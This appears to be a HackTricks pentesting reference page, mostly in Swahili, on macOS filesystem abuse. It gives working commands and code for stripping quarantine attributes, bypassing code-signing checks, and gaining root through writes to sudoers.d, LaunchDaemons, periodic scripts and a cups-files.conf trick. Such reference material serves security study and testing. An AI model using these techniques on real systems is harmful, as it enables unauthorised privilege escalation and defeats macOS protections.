# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Mchanganyiko wa ruhusa za POSIX

Ruhusa katika **directory**:

- **kusoma** - unaweza **kuorodhesha** entries za directory
- **kuandika** - unaweza **kufuta/kuandika** **files** katika directory na unaweza **kufuta folda tupu**.
- Lakini huwezi **kufuta/kubadilisha folda zisizo tupu** isipokuwa una ruhusa za kuandika juu yake.
- Huwezi **kubadilisha jina la folda** isipokuwa umiliki.
- **kutekeleza** - ume **ruhusiwa kupita** directory - ikiwa huna haki hii, huwezi kufikia files zozote ndani yake, au katika subdirectories zozote.

### Mchanganyiko Hatari

**Jinsi ya kufuta file/folda inayomilikiwa na root**, lakini:

- Mmiliki mmoja wa **directory** katika njia ni mtumiaji
- Mmiliki mmoja wa **directory** katika njia ni **kikundi cha watumiaji** chenye **ruhusa za kuandika**
- Kikundi cha watumiaji kina **ruhusa za kuandika** kwa **file**

Kwa mchanganyiko wowote wa hapo juu, mshambuliaji anaweza **kuingiza** **sym/hard link** kwenye njia inayotarajiwa ili kupata kuandika kwa kibali bila mipaka.

### Kesi Maalum ya Folder root R+X

Ikiwa kuna files katika **directory** ambapo **ni root pekee mwenye R+X access**, hizo **hazipatikani kwa mtu mwingine yeyote**. Hivyo, udhaifu unaoruhusu **kuhamasisha file inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi** hicho, kutoka folda hii **kwenda nyingine**, unaweza kutumiwa kusoma files hizi.

Mfano katika: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Link ya Alama / Link ngumu

### File/folda yenye ruhusa

Ikiwa mchakato wenye kibali unaandika data katika **file** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye ruhusa ya chini**, au ambayo inaweza **kuundwa awali** na mtumiaji mwenye ruhusa ya chini. Mtumiaji anaweza tu **kuielekeza kwa file nyingine** kupitia Link ya Alama au Link ngumu, na mchakato wenye kibali utaandika kwenye file hiyo.

Angalia katika sehemu nyingine ambapo mshambuliaji anaweza **kutilia shaka kuandika bila mipaka ili kupandisha ruhusa**.

### Fungua `O_NOFOLLOW`

Bendera `O_NOFOLLOW` inapokuwa inatumika na kazi `open` haitafuata symlink katika kipengele cha mwisho cha njia, lakini itafuata sehemu nyingine za njia. Njia sahihi ya kuzuia kufuata symlinks katika njia ni kwa kutumia bendera `O_NOFOLLOW_ANY`.

## .fileloc

Files zenye kiambatisho **`.fileloc`** zinaweza kuelekeza kwenye programu nyingine au binaries hivyo wakati zinapofunguliwa, programu/binary itakuwa ndiyo itakayotekelezwa.\
Mfano:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Ikiwa wito wa `open` haina bendera `O_CLOEXEC`, file descriptor itarithiwa na mchakato wa mtoto. Hivyo, ikiwa mchakato wenye mamlaka unafungua faili yenye mamlaka na kutekeleza mchakato unaodhibitiwa na mshambuliaji, mshambuliaji atakuwa **na FD juu ya faili yenye mamlaka**.

Ikiwa unaweza kufanya **mchakato ufungue faili au folda yenye mamlaka ya juu**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` na **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD kwa faili ndani ya `/etc/sudoers` na kuifanya iweze kutumika.

Kwa mfano: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), code: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## Avoid quarantine xattrs tricks

### Remove it
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ikiwa faili/folda ina sifa hii isiyoweza kubadilishwa, haitakuwa possible kuweka xattr juu yake.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

A **devfs** mount **haiungi xattr**, maelezo zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

ACL hii inazuia kuongeza `xattrs` kwenye faili
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** muundo wa faili unakopi faili pamoja na ACE zake.

Katika [**kanuni ya chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandiko ya ACL ulihifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili lililoshughulikiwa. Hivyo, ikiwa umeweka programu katika faili la zip kwa muundo wa faili wa **AppleDouble** ukiwa na ACL inayozuia xattrs nyingine kuandikwa ndani yake... xattr ya karantini haikuwekwa katika programu:

Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.

Ili kuiga hii tunahitaji kwanza kupata mfuatano sahihi wa acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Sio muhimu sana lakini naiacha hapa tu kwa sababu:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Kupita ukaguzi wa saini

### Kupita ukaguzi wa binaries za jukwaa

Baadhi ya ukaguzi wa usalama huangalia kama binary ni **binary ya jukwaa**, kwa mfano kuruhusu kuungana na huduma ya XPC. Hata hivyo, kama ilivyoonyeshwa katika kupita kwenye https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, inawezekana kupita ukaguzi huu kwa kupata binary ya jukwaa (kama /bin/ls) na kuingiza exploit kupitia dyld kwa kutumia variable ya mazingira `DYLD_INSERT_LIBRARIES`.

### Kupita bendera `CS_REQUIRE_LV` na `CS_FORCED_LV`

Inawezekana kwa binary inayotekelezwa kubadilisha bendera zake mwenyewe ili kupita ukaguzi kwa kutumia msimbo kama:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles zina faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** katika **bundle**. Kumbuka kwamba hash ya CodeResources pia **imejumuishwa katika executable**, hivyo hatuwezi kuingilia hapo pia.

Hata hivyo, kuna baadhi ya faili ambazo saini yake haitakaguliwa, hizi zina ufunguo omit katika plist, kama:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Inawezekana kuhesabu saini ya rasilimali kutoka kwa cli kwa:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Mtumiaji anaweza kuunganisha dmg maalum iliyoundwa hata juu ya folda zilizopo. Hivi ndivyo unaweza kuunda kifurushi cha dmg maalum chenye maudhui maalum:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Kawaida macOS inachomeka diski kwa kuzungumza na huduma ya Mach `com.apple.DiskArbitrarion.diskarbitrariond` (iliyotolewa na `/usr/libexec/diskarbitrationd`). Ikiwa unongeza paramu `-d` kwenye faili la LaunchDaemons plist na kuanzisha upya, itahifadhi kumbukumbu katika `/var/log/diskarbitrationd.log`.\
Hata hivyo, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext `com.apple.driver.DiskImages`.

## Maandishi ya Huru

### Mifumo ya sh ya Kila Wakati

Ikiwa skripti yako inaweza kutafsiriwa kama **shell script** unaweza kuandika upya **`/etc/periodic/daily/999.local`** shell script ambayo itazinduliwa kila siku.

Unaweza **kuigiza** utekelezaji wa skripti hii kwa: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza skripti ya kiholela kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Tuunda tu skripti `/Applications/Scripts/privesc.sh` na **amri** unazotaka kuendesha kama root.

### Faili la Sudoers

Ikiwa una **kuandika bila mipaka**, unaweza kuunda faili ndani ya folda **`/etc/sudoers.d/`** ukijipa **mamlaka ya sudo**.

### Faili za PATH

Faili **`/etc/paths`** ni moja ya maeneo makuu yanayojaza variable ya mazingira ya PATH. Lazima uwe root ili kuandika tena, lakini ikiwa skripti kutoka **mchakato wenye mamlaka** inatekeleza **amri bila njia kamili**, unaweza kuwa na uwezo wa **kudhibiti** kwa kubadilisha faili hili.

Pia unaweza kuandika faili katika **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya mazingira ya `PATH`.

### cups-files.conf

Teknolojia hii ilitumika katika [hiki andiko](https://www.kandji.io/blog/macos-audit-story-part1).

Unda faili `/etc/cups/cups-files.conf` na maudhui yafuatayo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Hii itaunda faili `/etc/sudoers.d/lpe` yenye ruhusa 777. Takataka za ziada mwishoni ni kuanzisha uundaji wa kumbukumbu ya makosa.

Kisha, andika katika `/etc/sudoers.d/lpe` usanidi unaohitajika ili kupandisha mamlaka kama `%staff ALL=(ALL) NOPASSWD:ALL`.

Kisha, badilisha faili `/etc/cups/cups-files.conf` tena ukionyesha `LogFilePerm 700` ili faili mpya ya sudoers iwe halali kwa kuanzisha `cupsctl`.

### Sandbox Escape

Inawezekana kutoroka sandbox ya macOS kwa kuandika FS isiyo na mipaka. Kwa baadhi ya mifano angalia ukurasa [macOS Auto Start](../../../../macos-auto-start-locations.md) lakini moja ya kawaida ni kuandika faili ya mapendeleo ya Terminal katika `~/Library/Preferences/com.apple.Terminal.plist` inayotekeleza amri wakati wa kuanzisha na kuitwa kwa kutumia `open`.

## Generate writable files as other users

Hii itazalisha faili inayomilikiwa na root ambayo inaweza kuandikwa na mimi ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Hii inaweza pia kufanya kazi kama privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**POSIX shared memory** inaruhusu michakato katika mifumo ya uendeshaji inayokubaliana na POSIX kufikia eneo la kawaida la kumbukumbu, ikirahisisha mawasiliano ya haraka ikilinganishwa na mbinu nyingine za mawasiliano kati ya michakato. Inahusisha kuunda au kufungua kitu cha kumbukumbu ya pamoja kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na kuunganisha katika nafasi ya anwani ya mchakato kwa kutumia `mmap()`. Michakato inaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la kumbukumbu. Ili kudhibiti ufikiaji wa pamoja na kuzuia uharibifu wa data, mitambo ya usawazishaji kama vile mutexes au semaphores mara nyingi hutumiwa. Hatimaye, michakato inafuta na kufunga kumbukumbu ya pamoja kwa kutumia `munmap()` na `close()`, na kwa hiari kuondoa kitu cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu ni wa ufanisi hasa kwa IPC ya haraka na yenye ufanisi katika mazingira ambapo michakato mingi inahitaji kufikia data ya pamoja kwa haraka.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Mfano wa Kanuni ya Mtumiaji</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** ni kipengele cha usalama kilichowekwa katika macOS ili kuboresha usalama na uaminifu wa **file descriptor operations** katika programu za mtumiaji. Hizi guarded descriptors zinatoa njia ya kuunganisha vizuizi maalum au "guards" na file descriptors, ambavyo vinatekelezwa na kernel.

Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za udhaifu wa usalama kama vile **unauthorized file access** au **race conditions**. Udhaifu huu hutokea wakati kwa mfano thread inapata file description ikitoa **thread nyingine yenye udhaifu ufikiaji juu yake** au wakati file descriptor inachukuliwa na mchakato wa mtoto mwenye udhaifu. Baadhi ya kazi zinazohusiana na kazi hii ni:

- `guarded_open_np`: Fungua FD na guard
- `guarded_close_np`: Funga
- `change_fdguard_np`: Badilisha bendera za guard kwenye descriptor (hata kuondoa ulinzi wa guard)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
